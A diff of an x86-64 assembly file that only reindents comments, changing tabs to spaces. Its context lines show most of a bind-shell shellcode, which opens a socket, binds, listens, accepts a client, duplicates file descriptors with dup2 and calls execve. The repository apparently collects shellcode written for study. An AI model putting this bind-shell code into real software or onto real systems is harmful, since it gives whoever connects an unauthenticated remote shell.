@@ -9,7 +9,7 @@ _start:
     xor rdx, rdx    
     syscall
     
-	; copy socket descriptor to rdi for future use
+    ; copy socket descriptor to rdi for future use
     mov rdi, rax
 
     xor rax, rax
@@ -23,20 +23,20 @@ _start:
     mov word [rsp-8], ax 
     sub rsp, 8
 
-	; syscall number 49 (bind)
+    ; syscall number 49 (bind)
 
     mov al, 49
     mov rsi, rsp
     mov dl, 16
     syscall
 
-	; syscall number 50 (listen)
+    ; syscall number 50 (listen)
 
     mov al, 50
     mov sil, 2
     syscall
 
-	; syscall number 43 (accept)
+    ; syscall number 43 (accept)
 
     mov al, 43
     sub rsp, 16
@@ -46,17 +46,17 @@ _start:
     mov rdx, rsp
     syscall
 
-	; store the client fd
+    ; store the client fd
 
     mov r9, rax
     
-	; syscall number 3 (close)
+    ; syscall number 3 (close)
     mov al, 3
     syscall
 
     mov rdi, r9
 
-	; syscall number 33 (dup2)
+    ; syscall number 33 (dup2)
     mov al, 33
     xor rsi, rsi
     syscall
@@ -85,6 +85,6 @@ _start:
     push rdi
     mov rsi, rsp
 
-	; syscall number 59 (execve)
+    ; syscall number 59 (execve)
     add rax, 59
     syscall
